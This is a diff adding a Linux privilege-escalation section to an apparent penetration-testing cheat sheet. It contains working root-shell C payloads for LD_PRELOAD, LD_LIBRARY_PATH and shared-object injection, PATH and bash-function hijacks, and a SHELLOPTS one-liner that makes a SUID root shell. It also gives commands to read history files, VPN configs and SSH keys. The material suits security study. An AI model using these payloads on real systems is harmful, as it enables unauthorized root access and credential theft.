@@ -67,6 +67,11 @@
         mimikatz> sekurlsa::logonpasswords
         ```
 
+##### DCSync
+
+### Pass the Ticket
+
+### ADCS (ECS1-16)
 
 ## Linux
 > [GTFOBins](https://gtfobins.github.io/)
@@ -75,3 +80,206 @@
 > [Escape from Restricted Shells | 0xffsec](https://0xffsec.com/handbook/shells/restricted-shells/)
 
 - `$ ssh -t localhost "bash --noprofile"`
+
+### Service Exploits
+- [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518)
+
+### Weak File Permission
+
+#### Readable /etc/shadow
+- unshadow + john
+
+#### Writable /etc/shadow
+- mkpasswd
+
+#### Writable /etc/passwd
+- openssl passwd
+
+
+### Sudo
+
+#### Shell Escape Sequences
+- GTFOBins
+
+#### Environment Variables
+- LD\_PRELOAD
+    > sudo LD_PRELOAD=\<outfile.so> \<bin>
+
+    ```c
+    #gcc -fPIC -shared -nostartfiles -o <outfile.so> source.c
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+
+    void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0, 0, 0);
+        system("/bin/bash -p");
+    }
+
+    ```
+    
+- LD\_LIBRARY\_PATH
+    > Name the .so to a name in `ldd <target>` list.
+    > Choose a .so that will be loaded later, such as libcrypt.so.1.
+
+    > sudo LD_LIBRARY_PATH=\<path of outfile> \<bin\>
+
+    ```c
+    #gcc -fPIC -shared -o <outfile.so> source.c
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    static void hijack() __attribute__((constructor))
+
+    void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0, 0, 0);
+        system("/bin/bash -p");
+    }
+    ```
+
+### Cron Jobs
+
+#### File Permissions
+- Change files run with cronjob.
+
+#### PATH Envionment Variable
+- Put crafted command file in the path used by the cronjob.
+
+    ```
+    /etc/crontab
+    ------------
+    PATH=/home/user:/usr/local/bin:/bin
+
+    * * * * * root run.sh
+    ```
+
+    ```
+    /home/user/run.sh <- add this
+    ```
+
+#### Wildcards
+- Create files act as the arguments of the command with \*.
+
+    ```bash
+    $ touch --args1=1
+    $ touch --args2=2
+    $ <command> *
+    ```
+
+### SUID / SGID
+- find
+
+    ```bash
+    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+    ```
+
+#### Known Exploits
+- Find any target that has known vulnerabilities.
+    - Exploit-DB
+    - Google
+    - Github
+
+#### Shared Object Injection
+- Find a library that can be replaced.
+    - `strace <binary>`
+
+- Replace the library.
+
+    ```c
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    static void inject() __attribute__((constructor));
+
+    void inject() {
+            setuid(0);
+            system("/bin/bash -p");
+    }
+    ```
+
+#### Environment Variables
+- Find commands that will run without the full path.
+    - `strings <binary>`
+
+        ```
+        ...
+        service ...
+        ...
+        ```
+
+- Put the payload in the path added to `$PATH`.
+    - `PATH=.:$PATH <binary>`
+
+        ```
+        ./service <- add this file
+        ---------
+        #!/bin/bash
+        /bin/bash -p
+        ```
+
+#### Abusing Shell Feature (< 4.2-048)
+- Find commands that will run without the full path.
+    - `strings <binary>`
+
+        ```
+        ...
+        /usr/sbin/service ...
+        ...
+        ```
+
+- Define shell functions with names that resemble file paths (bash version < 4.2-048)
+
+    ```bash
+    function /usr/sbin/service { /bin/bash -p;  }
+    export -f /usr/sbin/service
+    ```
+
+#### Abusing Shell Feature (< 4.4)
+- Run command in debug mode.
+
+    ```bash
+    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <binary>
+    /tmp/rootbash -p
+    ```
+
+
+### Passwords & Keys
+
+#### History Files
+- `cat ~/.*history | less`
+
+#### Config Files
+- `cat /home/user/myvpn.ovpn`
+
+#### SSH Keys
+- `find / -type d -name .ssh 2>/dev/null`
+
+
+### NFS
+- `no_root_squash`
+
+    ```bash
+    $ cat /etc/exports
+    ...
+    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+    ...
+    ```
+
+### Kernel Exploits
+- Linux Exploit Suggester 2
+
+    > - https://github.com/The-Z-Labs/linux-exploit-suggester
+    > - https://www.kali.org/tools/linux-exploit-suggester/
+
+### Privilege Escalation Scripts
+- https://github.com/rebootuser/LinEnum
+- https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS 
+- https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
+
+### Known CVE
+- Dirty Cow (CVE-2016-5195)
+- Dirty Pipe (CVE-2022-0847)
+- Copy Fail (CVE-2026-31431)
+- Dirty Frag
